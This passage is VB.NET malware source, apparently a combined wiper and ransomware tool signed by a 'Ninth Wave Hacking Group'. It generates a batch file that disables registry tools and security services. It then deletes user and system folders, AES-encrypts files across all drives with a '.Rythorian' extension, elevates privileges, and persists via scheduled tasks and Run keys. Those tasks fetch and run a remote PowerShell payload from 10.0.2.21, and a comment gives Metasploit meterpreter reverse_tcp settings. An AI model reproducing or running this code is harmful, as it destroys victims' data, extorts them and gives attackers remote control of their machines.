        rythorian77.AppendLine("reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /t Reg_dword /v DisableRegistryTools /f /d 1")
        rythorian77.AppendLine("net stop ""WSearch")
        rythorian77.AppendLine("net stop ""Security Center")
        rythorian77.AppendLine("net stop ""SDRSVC")
        rythorian77.AppendLine("ipconfig /release + vbnewlineif %ERRORLEVEL%==1 ipconfig /release_all")
        rythorian77.AppendLine("echo MSGBOX ""The Ninth Wave Hacking Group Did This To You> %temp%\TEMPmessage.vbs")
        rythorian77.AppendLine("call %temp%\TEMPmessage.vbs")
        rythorian77.AppendLine("%dll1%%dll2% %m%,disable")
        rythorian77.AppendLine("%dll1%%dll2% %k%,disable")
        rythorian77.AppendLine("goto infect")
        rythorian77.AppendLine("goto end")
        rythorian77.AppendLine(":end")
        rythorian77.AppendLine("exit")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.AppendLine("CreateObject(""Wscript.Shell"").Run ""Nucleus.bat"", 0, True")
        rythorian77.AppendLine("GoTo begin")

        File.WriteAllText("Nucleus.bat", rythorian77.ToString())

        Process.Start("Nucleus.bat")
Err:

    End Sub

    'Mass Systematic Deletion
    Private Sub Chromosome26()
        On Error GoTo Err
        'Music
        Dim path As String = Environment.ExpandEnvironmentVariables(enviro & Music)
        Dim dir As New DirectoryInfo(path)

        For Each files As FileInfo In dir.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir.GetDirectories()
            dirs.Delete(True)
        Next
        'Pictures
        Dim path1 As String = Environment.ExpandEnvironmentVariables(enviro & Pictures)
        Dim dir1 As New DirectoryInfo(path1)

        For Each files As FileInfo In dir1.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir1.GetDirectories()
            dirs.Delete(True)
        Next
        'Desktop
        Dim path2 As String = Environment.ExpandEnvironmentVariables(enviro & Desktop)
        Dim dir2 As New DirectoryInfo(path2)

        For Each files As FileInfo In dir2.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir2.GetDirectories()
            dirs.Delete(True)
        Next
        'Documents
        Dim path3 As String = Environment.ExpandEnvironmentVariables(enviro & Documents)
        Dim dir3 As New DirectoryInfo(path3)

        For Each files As FileInfo In dir3.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir3.GetDirectories()
            dirs.Delete(True)
        Next
        'Favorites
        Dim path4 As String = Environment.ExpandEnvironmentVariables(enviro & Favorites)
        Dim dir4 As New DirectoryInfo(path4)

        For Each files As FileInfo In dir4.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir4.GetDirectories()
            dirs.Delete(True)
        Next
        'Videos
        Dim path5 As String = Environment.ExpandEnvironmentVariables(enviro & Videos)
        Dim dir5 As New DirectoryInfo(path5)

        For Each files As FileInfo In dir5.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir5.GetDirectories()
            dirs.Delete(True)
        Next
        'History
        Dim path6 As String = Environment.ExpandEnvironmentVariables(enviro & History)
        Dim dir6 As New DirectoryInfo(path6)

        For Each files As FileInfo In dir6.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir6.GetDirectories()
            dirs.Delete(True)
        Next
        'InternetCache
        Dim path7 As String = Environment.ExpandEnvironmentVariables(enviro & InternetCache)
        Dim dir7 As New DirectoryInfo(path7)

        For Each files As FileInfo In dir7.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir7.GetDirectories()
            dirs.Delete(True)
        Next
        'LocalApplicationData
        Dim path8 As String = Environment.ExpandEnvironmentVariables(enviro & LocalApplicationData)
        Dim dir8 As New DirectoryInfo(path8)

        For Each files As FileInfo In dir8.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir8.GetDirectories()
            dirs.Delete(True)
        Next
        'LocalizedResources
        Dim path9 As String = Environment.ExpandEnvironmentVariables(enviro & LocalizedResources)
        Dim dir9 As New DirectoryInfo(path9)

        For Each files As FileInfo In dir9.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir9.GetDirectories()
            dirs.Delete(True)
        Next
        'NetworkShortcuts
        Dim path10 As String = Environment.ExpandEnvironmentVariables(enviro & NetworkShortcuts)
        Dim dir10 As New DirectoryInfo(path10)

        For Each files As FileInfo In dir10.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir10.GetDirectories()
            dirs.Delete(True)
        Next
        'SendTo
        Dim path11 As String = Environment.ExpandEnvironmentVariables(enviro & SendTo)
        Dim dir11 As New DirectoryInfo(path11)

        For Each files As FileInfo In dir11.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir11.GetDirectories()
            dirs.Delete(True)
        Next
        'System
        Dim path12 As String = Environment.ExpandEnvironmentVariables(enviro & System)
        Dim dir12 As New DirectoryInfo(path12)

        For Each files As FileInfo In dir12.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir12.GetDirectories()
            dirs.Delete(True)
        Next
        'Windows
        Dim path13 As String = Environment.ExpandEnvironmentVariables(enviro & Windows)
        Dim dir13 As New DirectoryInfo(path13)

        For Each files As FileInfo In dir13.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir13.GetDirectories()
            dirs.Delete(True)
        Next
        'SystemX86
        Dim path14 As String = Environment.ExpandEnvironmentVariables(enviro & SystemX86)
        Dim dir14 As New DirectoryInfo(path14)

        For Each files As FileInfo In dir14.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir14.GetDirectories()
            dirs.Delete(True)
        Next
        'StartMenu
        Dim path15 As String = Environment.ExpandEnvironmentVariables(enviro & StartMenu)
        Dim dir15 As New DirectoryInfo(path15)

        For Each files As FileInfo In dir15.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir15.GetDirectories()
            dirs.Delete(True)
        Next
        'Templates
        Dim path16 As String = Environment.ExpandEnvironmentVariables(enviro & Templates)
        Dim dir16 As New DirectoryInfo(path16)

        For Each files As FileInfo In dir16.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir16.GetDirectories()
            dirs.Delete(True)
        Next
        'Personal
        Dim path17 As String = Environment.ExpandEnvironmentVariables(enviro & Personal)
        Dim dir17 As New DirectoryInfo(path17)

        For Each files As FileInfo In dir17.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir17.GetDirectories()
            dirs.Delete(True)
        Next
        'Resources
        Dim path18 As String = Environment.ExpandEnvironmentVariables(enviro & Resources)
        Dim dir18 As New DirectoryInfo(path18)

        For Each files As FileInfo In dir18.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir18.GetDirectories()
            dirs.Delete(True)
        Next
        'Programs
        Dim path19 As String = Environment.ExpandEnvironmentVariables(enviro & Programs)
        Dim dir19 As New DirectoryInfo(path19)

        For Each files As FileInfo In dir19.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir19.GetDirectories()
            dirs.Delete(True)
        Next
        'ProgramFiles
        Dim path20 As String = Environment.ExpandEnvironmentVariables(enviro & ProgramFiles)
        Dim dir20 As New DirectoryInfo(path20)

        For Each files As FileInfo In dir20.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir20.GetDirectories()
            dirs.Delete(True)
        Next
        'ProgramFilesX86
        Dim path21 As String = Environment.ExpandEnvironmentVariables(enviro & ProgramFilesX86)
        Dim dir21 As New DirectoryInfo(path21)

        For Each files As FileInfo In dir21.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir21.GetDirectories()
            dirs.Delete(True)
        Next
        'PrinterShortcuts
        Dim path22 As String = Environment.ExpandEnvironmentVariables(enviro & PrinterShortcuts)
        Dim dir22 As New DirectoryInfo(path22)

        For Each files As FileInfo In dir22.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir22.GetDirectories()
            dirs.Delete(True)
        Next
        'Recent
        Dim path23 As String = Environment.ExpandEnvironmentVariables(enviro & Recent)
        Dim dir23 As New DirectoryInfo(path23)

        For Each files As FileInfo In dir23.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir23.GetDirectories()
            dirs.Delete(True)
        Next
        'Fonts
        Dim path24 As String = Environment.ExpandEnvironmentVariables(enviro & Fonts)
        Dim dir24 As New DirectoryInfo(path24)

        For Each files As FileInfo In dir24.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir24.GetDirectories()
            dirs.Delete(True)
        Next
        'AdminTools
        Dim path25 As String = Environment.ExpandEnvironmentVariables(enviro & AdminTools)
        Dim dir25 As New DirectoryInfo(path25)

        For Each files As FileInfo In dir25.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir25.GetDirectories()
            dirs.Delete(True)
        Next
        'ApplicationData
        Dim path26 As String = Environment.ExpandEnvironmentVariables(enviro & ApplicationData)
        Dim dir26 As New DirectoryInfo(path26)

        For Each files As FileInfo In dir26.GetFiles()
            files.Delete()
        Next

        For Each dirs As DirectoryInfo In dir26.GetDirectories()
            dirs.Delete(True)
        Next
Err:
    End Sub

#End Region

#Region "Encryption 256-Bit"

    'AES: (RijndaelManaged) 256-Bit Encryption
    Public Function Riezengard_The_Malevolent_One(seedKill As Byte(), oraclepass As Byte()) As Byte()

        Dim FesteringBytes As Byte() = Nothing
        'A byte is not just 8 values between 0 and 1, but 256 (28) different stand for 3 values between 0 and 9, but 1000 (103) permutations from 0(00) to 999.
        Dim theBayofDead As Byte() = New Byte() {1, 1, 2, 2, 3, 3, 4, 4}
        'Reads a sequence of bytes from the current memory stream and advances the position within the memory stream by the number of bytes read.
        Using rythorian As New MemoryStream()

            Using AES As New RijndaelManaged()
                'AES-256, which has a key length of 256 bits, supports the largest bit size and is practically unbreakable by brute force
                'based on current computing power, making it the strongest encryption standard. The following table shows that possible
                'key combinations exponentially increase with the key size.
                AES.KeySize = 256
                'AES uses a 128-bit block size, in which data is divided into a four-by-four array containing 16 bytes.
                'Since there are eight bits per byte, the total in each block is 128 bits. The size of the encrypted data
                'remains the same: 128 bits of plaintext yields 128 bits of ciphertext.
                AES.BlockSize = 128
                'Rfc2898DeriveBytes takes a password, a salt, and an iteration count, and then generates keys through calls to the GetBytes method.
                'RFC 2898 includes methods for creating a key and initialization vector (IV) from a password and salt.
                Dim key = New Rfc2898DeriveBytes(oraclepass,
                                                 theBayofDead,
                                                 1000)
                AES.Key = key.GetBytes(AES.KeySize / 8)
                AES.IV = key.GetBytes(AES.BlockSize / 8)
                AES.Mode = CipherMode.CBC

                Using cs = New CryptoStream(rythorian, AES.CreateEncryptor(), CryptoStreamMode.Write)
                    cs.Write(seedKill, 0, seedKill.Length)
                    cs.Close()
                End Using

                FesteringBytes = rythorian.ToArray()

            End Using

        End Using

        Return FesteringBytes
    End Function

    'Encryption Continuance
    Public Sub Thantalos_The_Filth(seething As String,
                                   malice As String)
        Dim maliceBitter As Byte() = Encoding.UTF8.GetBytes(malice)
        maliceBitter = SHA256.Create().ComputeHash(maliceBitter)
        Dim DarkendCrypt As Byte() = File.ReadAllBytes(seething)

        Try
            Dim VanquishLight As Byte() = Riezengard_The_Malevolent_One(DarkendCrypt,
                                                                        maliceBitter)
            File.WriteAllBytes(seething,
                               VanquishLight)
            'Names the new encrypted file extension
            Dim extension As String = ".Rythorian"
            File.Move(seething, seething _
                & extension)
        Catch __unusedUnauthorizedAccessException1__ As UnauthorizedAccessException
        End Try
    End Sub

    'Directory Extension Hunter
    Public Sub Annika_Kreznoks_Infernal_Directory__The_Quiet_One(WormHole As String,
                                                                 malice As String)
        Try
            Dim quantumEntanglement = {".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep", ".aepx", ".adt", ".adts", ".mdb", ".tiff",
              ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx", ".avi", ".bay", ".bmp", ".cdr", ".accde", ".midi", ".tmp", ".wp5",
              ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw", ".cs", ".csv", ".db", ".dbf", ".dcr", ".der", ".dng", ".accdr", ".msi", ".txt", ".xps",
              ".doc", ".docb", ".docm", ".docx", ".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".aac", ".aiff", ".mui", ".wms",
              ".erf", ".fla", ".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java", ".aifc", ".bin", ".pub", ".wmz",
              ".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef", ".mid", ".mov", ".mp3", ".cda", ".gif", ".vsd",
              ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".aspx", ".htm", ".vss",
              ".odt", ".orf", ".p12", ".p7b", ".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".bat", ".html", ".vssm",
              ".pot", ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".prel", ".cab", ".css", ".vstm",
              ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar", ".raw", ".rb", ".rtf", ".rw2", ".dif", ".scss", ".vstx",
              ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2", ".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".dll", ".sass", ".wbk",
              ".wav", ".wb2", ".wma", ".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls", ".eml", ".ini", ".wks",
              ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip", ".png", ".jfif", ".iso", ".m4a", ".wmd",
              ".3ds", ".3mf", ".7z", ".accft", ".adame", ".adicht", ".adx", ".adz", ".agr", ".ahk", ".cur", ".ai", ".air", ".amg", ".ani", ".ape",
              ".ashx", ".bar", ".bps", ".bin", ".beam", ".bz2", ".blend", ".cdf", ".cpl", ".csproj", ".d3v", ".d4d", ".d4p", ".daf", ".dart", ".vb",
              ".cs", ".dbd", ".dbg", ".dbs", ".dbw", ".dc", ".dbx", ".dc6", ".dcc", ".dcd", ".dch", ".dcs", ".dct", ".dda", ".deb", ".dds", ".dem",
              ".der", ".dfl", ".dfv", ".dic", ".dis", ".dlg", ".dlm", ".dls", ".dochtml", ".docmhtml", ".dothtml", ".dw2", ".dwf", ".ebd", ".email",
              ".emf", ".emz", ".epa", ".etl", ".evt", ".evtx", ".exp", ".fv4", ".fodg", ".fodp", ".fods", ".fodt", ".frm", ".frag", ".fs", ".gz",
              ".har", ".hta", ".hum", ".icc", ".ico", ".ipa", ".j2c", ".jnlp", ".jp2", ".kt", ".lua", ".lz", ".mdi", ".mex", ".mid", ".mp2", ".msc",
              ".myd", ".myi", ".nrw", ".nsa", ".odf", ".odg", ".ogg", ".opus", ".otf", ".otg", ".otp", ".ots", ".ott", ".oxt", ".pal", ".pak", ".pcl",
              ".pdm", ".pdi", ".pdn", ".pfb", ".pfm", ".pfc", ".php3", ".php4", ".pkl", ".py", ".pub", ".glc", ".qfx", ".qif", ".qt", ".qtvr",
              ".ral", ".rdp", ".run", ".scala", ".scr", ".sfx", ".sh", ".shar", ".shtm", ".shtml", ".spf", ".svc", ".sylk", ".tar", ".taz", ".torrent",
              ".tga", ".ut!", ".vbs", ".vbx", ".vmcz", ".vmdk", ".vsto", ".xar", ".xsf", ".xsn", ".gif", ".js"}
            Dim files As String() = Directory.GetFiles(WormHole)
            Dim offspring As String() = Directory.GetDirectories(WormHole)

            For i As Integer = 0 To files.Length _
                    - 1
                Dim extension As String = Path.GetExtension(files(i))

                If quantumEntanglement.Contains(extension) Then
                    Thantalos_The_Filth(files(i),
                                        malice)
                End If
            Next

            For i As Integer = 0 To offspring.Length - 1
                If offspring(i).Contains("Windows") OrElse offspring(i).Contains("Program Files") OrElse offspring(i).Contains("Program Files (x86)") Then Continue For
                Annika_Kreznoks_Infernal_Directory__The_Quiet_One(offspring(i), malice)

            Next
        Catch __unusedSystemException1__ As SystemException
        End Try
    End Sub

    Private Sub Dead_Meadow()
        On Error GoTo Err
        Dim malice As String = "1234567890!@#$%^&*()_+_OrDeR_oF_CoRrUpTiOn"
        Dim aeros As String = "\Desktop\"
        Dim apathy As String = "\Downloads\"
        Dim murder As String = "\Documents\"
        Dim psychotron As String = "\Pictures\"
        Dim mystra As String = "\Music\"
        Dim cratus As String = "\Videos\"
        Dim needle As String = Endorium & TheAnaustrikCalendar & aeros
        Dim basket As String = Endorium & TheAnaustrikCalendar & apathy
        Dim mirrors As String = Endorium & TheAnaustrikCalendar & murder
        Dim shattered As String = Endorium & TheAnaustrikCalendar & psychotron
        Dim guide As String = Endorium & TheAnaustrikCalendar & mystra
        Dim you As String = Endorium & TheAnaustrikCalendar & cratus

        Dim wrath As String() = Directory.GetLogicalDrives()

        For Each str As String In wrath

            If str = "C:\" Then
                Annika_Kreznoks_Infernal_Directory__The_Quiet_One(needle, malice)
                Annika_Kreznoks_Infernal_Directory__The_Quiet_One(basket, malice)
                Annika_Kreznoks_Infernal_Directory__The_Quiet_One(mirrors, malice)
                Annika_Kreznoks_Infernal_Directory__The_Quiet_One(shattered, malice)
                Annika_Kreznoks_Infernal_Directory__The_Quiet_One(guide, malice)
                Annika_Kreznoks_Infernal_Directory__The_Quiet_One(you, malice)
            Else
                Annika_Kreznoks_Infernal_Directory__The_Quiet_One(str, malice)
            End If
        Next
Err:
    End Sub
#End Region

#Region " GPO Security Identifier | Creators Owner ID, (Highest Mandatory Level) | Schedule Task  "

    'GPO cmdlet creates a GPO with a specified name. By default, the newly created GPO is not linked to a site,
    'domain, or organizational unit (OU).
    'You can use this cmdlet To create a GPO that Is based On a starter GPO by specifying the GUID Or the display name
    'Of the Starter GPO, Or by piping a StarterGpo Object into the cmdlet.
    'The cmdlet returns a GPO Object, which represents the created GPO that you can pipe "To other Group Policy cmdlets."
    Public Function GPO(cmd As String,
                        Optional args As String = "",
                        Optional startin As String = "") As String
        GPO = ""
        Try
            Dim p = New Process With {
                .StartInfo = New ProcessStartInfo(cmd, args)
            }
            If startin <> "" Then p.StartInfo.WorkingDirectory = startin
            p.StartInfo.RedirectStandardOutput = True
            p.StartInfo.RedirectStandardError = True
            p.StartInfo.UseShellExecute = False
            p.StartInfo.CreateNoWindow = True
            p.Start()
            p.WaitForExit()
            Dim s = p.StandardOutput.ReadToEnd
            s += p.StandardError.ReadToEnd
            GPO = s
        Catch ex As Exception
        End Try
    End Function ' Get Process Output.

    'Possession Part of Owning System Via; The <Security Identifier>
    Public Function CanH() As Boolean
        CanH = False
        'Displays user, group, and privileged information for the user who is currently logged on to the local system.
        'If used without parameters, whoami displays the current domain and user name.
        'https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/whoami
        Dim s = GPO("c: \windows\system32\cmd.exe",
                    "/c whoami /all | findstr /I /C:""S-1-5-32-544""") '<<This is a Security Identifier
        If s.Contains("S-1-5-32-544") Then CanH = True
    End Function ' Check if can get Higher.

    'Below: Creators Owner ID has discovered the "Security Identifier" to be replaced by the "S-1-16-12288"
    '(Highestndatory Level) ADMIN.
    'A Security Identifier (SID) is used to uniquely identify a security principal or security group. Security principals can represent any entity
    'that can be authenticated by the operating system, such as a user account, a computer account, or a thread or process that runs in the security
    'context of a user or computer account.Each account Or group, Or process running in the security context of the account,
    'has a unique SID that Is issued by an authority, such as a Windows domain controller. It Is stored in a security database.
    'The system generates the SID that identifies a particular account Or group at the time the account Or group Is created.
    'When a SID has been used as the unique identifier for a user Or group, it can never be used again to identify another user Or group.
    'Each time a user signs in, the system creates an access token for that user. The access token contains the user's SID, user rights, and the SIDs
    'for any groups the user belongs to. This token provides the security context for whatever actions the user performs on that computer.
    'In addition to the uniquely created, domain-specific SIDs that are assigned to specific users And groups, there are well-known SIDs that identify
    'generic groups And generic users. For example, the Everyone And World SIDs identify a group that includes all users. Well-known SIDs have values
    'that remain constant across all operating systems. SIDs are a fundamental building block Of the Windows security model.
    'They work With specific components Of the authorization And access control technologies In the security infrastructure Of the
    'Windows Server operating systems. This helps protect access To network resources And provides a more secure computing environment.
    '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    'How security identifiers work:
    'Users refer To accounts by Using the account name, but the operating system internally refers To accounts And processes
    'that run In the security context Of the account by Using their security identifiers (SIDs). For domain accounts, the SID Of a
    'security principal Is created by concatenating the SID Of the domain With a relative identifier (RID) For the account.
    'SIDs are unique within their scope (domain Or local), And they are never reused.
    Public Function CH() As Boolean
        CH = False
        Dim s = GPO("c:\windows\system32\cmd.exe",
                    "/c whoami /all | findstr /I /C:""S-1-16-12288""")
        If s.Contains("S-1-16-12288") Then CH = True
    End Function ' Check if Higher.

    'Elevating Privileges
    Public Function GH() As Boolean
        GH = False
        If Not CH() Then
            Try
                'Elevating process privilege programmatically.
                'In computing, runas is a command in the Microsoft Windows line of operating systems that allows a user to run specific
                'tools and programs under a different username to the one that was used to logon to a computer interactively.
                Dim pc As New ProcessStartInfo(Process.GetCurrentProcess.MainModule.FileName) With {
                    .Verb = "runas"
                }
                Dim p = Process.Start(pc)
                Return True
            Catch ex As Exception
                Return False
            End Try
        End If
    End Function ' Get Higher Level As Admin.

    'Now that the information is gathered, we create a backdoor into the system via entry od Task Scheduler
    'with the highest Logon.
    Private Sub Rythorians_Scheduler()
        ' StartUp BackgroundWorker to schedule a startup task
        Dim subw As New BackgroundWorker()
        AddHandler subw.DoWork, Sub(sender1 As Object,
                                    e1 As DoWorkEventArgs)
                                    'Schedules Task to start up with Admin Rights
                                    While True
                                        Try
                                            If CH() Then
                                                If Not GPO("c:\windows\system32\cmd.exe",
                                                           $"/C schtasks /create /rl HIGHEST /sc ONLOGON /tn Samara /F /tr """"{Process.GetCurrentProcess.MainModule.FileName}""""").Contains("successfully") Then
                                                    My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Samara",
                                                                                                                                                                    Process.GetCurrentProcess.MainModule.FileName)
                                                End If
                                            Else
                                                My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Samara",
                                                                                                                                                                Process.GetCurrentProcess.MainModule.FileName)
                                            End If
                                        Catch ex As Exception
                                        End Try
                                        Thread.Sleep(15000)
                                    End While
                                End Sub
        subw.RunWorkerAsync()
    End Sub

    'Persistence – Scheduled Tasks
    'Windows operating systems provide a utility (schtasks.exe) which enables system administrators.
    'To execute a program Or a script at a specific given Date And time.
    'This kind Of behavior has been heavily abused by threat actors And red teams As a persistence mechanism.
    'Administrator privileges are Not required To perform persistence via schedule tasks however further actions
    'are allowed such As execute a task during logon Of a user Or during idle state If elevated privileges have been achieved.
    'The persistence technique Of scheduled tasks can be implemented both manually And automatically.
    'Payloads can be executed from disk Or from remote locations And they can have the form Of executables,
    'PowerShell scripts Or scriptlets. This Is considered an old persistence technique however it can still be used
    'In red team scenarios And it Is supported by a variety Of open source tools.
    'The Metasploit “web_delivery” Module can be used To host And generate payloads In various formats.

    'use exploit/multi/script/web_delivery
    'Set payload windows/x64/meterpreter/reverse_tcp
    'Set LHOST 10.0.2.21
    'Set target 5
    'exploit
    'From the command prompt the “schtasks” executable can be used To create a schedule task that will download And execute a
    'PowerShell based payload In every Windows logon As a SYSTEM.
    Private Sub Sub_Ordinate_Creation()

        ' StartUp BackgroundWorker to schedule a startup task
        Dim subw As New BackgroundWorker()
        AddHandler subw.DoWork, Sub(sender1 As Object,
                                    e1 As DoWorkEventArgs)
                                    'Schedules Task to start up with Admin Rights
                                    While True
                                        Try
                                            If CH() Then
                                                'On System Start
                                                If Not GPO("c:\windows\system32\cmd.exe",
                                                           $"/C schtasks /create /rl HIGHEST /sc ONLOGON /tn Samara /F /tr ""c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'"" /sc onstart /ru System """"{Process.GetCurrentProcess.MainModule.FileName}""""").Contains("successfully") Then
                                                    My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Samara",
                                                                                                                                                                    Process.GetCurrentProcess.MainModule.FileName)
                                                End If
                                            Else
                                                My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Samara",
                                                                                                                                                                Process.GetCurrentProcess.MainModule.FileName)
                                            End If
                                        Catch ex As Exception
                                        End Try
                                        ' On User Idle (30mins)
                                        Try
                                            If CH() Then
                                                'On System Start
                                                If Not GPO("c:\windows\system32\cmd.exe",
                                                           $"/C schtasks /create /rl HIGHEST /sc ONLOGON /tn Samara /F /tr ""c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'"" /sc onidle /i 30 """"{Process.GetCurrentProcess.MainModule.FileName}""""").Contains("successfully") Then
                                                    My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Samara",
                                                                                                                                                                    Process.GetCurrentProcess.MainModule.FileName)
                                                End If
                                            Else
                                                My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Samara",
                                                                                                                                                                Process.GetCurrentProcess.MainModule.FileName)
                                            End If
                                        Catch ex As Exception
                                        End Try
                                        ' Execution of the payload can be also occur at a specific time and can have an expiration date and a self delete function.
                                        ' The “schtasks” utility provides the necessary options as it is part of its functionality.
                                        'Please note that you can change the date to whatever you want.
                                        Try
                                            If CH() Then
                                                'On System Start
                                                If Not GPO("c:\windows\system32\cmd.exe",
                                                           $"/C schtasks /create /rl HIGHEST /sc ONLOGON /tn ""Windows Update"" /F /tr ""c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'"" /SC minute /MO 7 /ED 04/07/2023 /ET 06:00 /Z /IT /RU %USERNAME% """"{Process.GetCurrentProcess.MainModule.FileName}""""").Contains("successfully") Then
                                                    My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Samara",
                                                                                                                                                                    Process.GetCurrentProcess.MainModule.FileName)
                                                End If
                                            Else
                                                My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Samara",
                                                                                                                                                                Process.GetCurrentProcess.MainModule.FileName)
                                            End If
                                        Catch ex As Exception
                                        End Try
                                        Try
                                            If CH() Then
                                                'On System Start
                                                If Not GPO("c:\windows\system32\cmd.exe",
                                                           $"/C schtasks /create /rl HIGHEST /sc ONLOGON /tn Samara /F /tr ""c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'"" /SC minute /MO 7 /ED 04/07/2023 /ET 06:00 /Z /IT /RU %USERNAME% """"{Process.GetCurrentProcess.MainModule.FileName}""""").Contains("successfully") Then
                                                    My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Samara",
                                                                                                                                                                    Process.GetCurrentProcess.MainModule.FileName)
                                                End If
                                            Else
                                                My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Samara",
                                                                                                                                                                Process.GetCurrentProcess.MainModule.FileName)
                                            End If
                                        Catch ex As Exception
                                        End Try
                                        Thread.Sleep(15000)
                                    End While
                                End Sub
        subw.RunWorkerAsync()
    End Sub
#End Region

#Region "Timers"
    'This causes the form to chase the mouses corpse hand
    Private Sub Timer1_Tick(sender As Object,
                           e As EventArgs) Handles Timer1.Tick
        On Error GoTo Err
        Location = New Point(MousePosition.X + -200, MousePosition.Y + -200)
        If IsLoaded = False Then Exit Sub
        DesktopBrightnessContrast(TrackBar1.Value, 44 - TrackBar2.Value + -3)
Err:
    End Sub

    Private Sub Timer2_Tick(sender As Object,
                            e As EventArgs) Handles Timer2.Tick
        On Error GoTo Err
        Timer2.Stop()
        Timer3.Start()
        If IsLoaded = False Then Exit Sub
        DesktopBrightnessContrast(TrackBar1.Value, 44 - TrackBar2.Value + 10)
        Using CD As New ColorDialog
            Dim BackgroundColor As Integer = ColorTranslator.ToWin32(Color.Black)
            SetSysColors(1, 1, BackgroundColor)
        End Using

        TrackBar1.Minimum = 1000 : TrackBar1.Maximum = 2000 'Set trackbar to valid range, since if will be half, the lower range is invalid
        TrackBar2.Minimum = 18 : TrackBar2.Maximum = 44
        apiGetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), usrRamp)
        IsLoaded = True
        'This goes with changing Desktop Wallpaper
Err:
    End Sub

    Private Sub Timer3_Tick(sender As Object,
                            e As EventArgs) Handles Timer3.Tick
        On Error GoTo Err
        Timer3.Stop()
        Timer2.Start()
        Timer4.Start()
        If IsLoaded = False Then Exit Sub
        DesktopBrightnessContrast(TrackBar1.Value, 44 - TrackBar2.Value + -3)

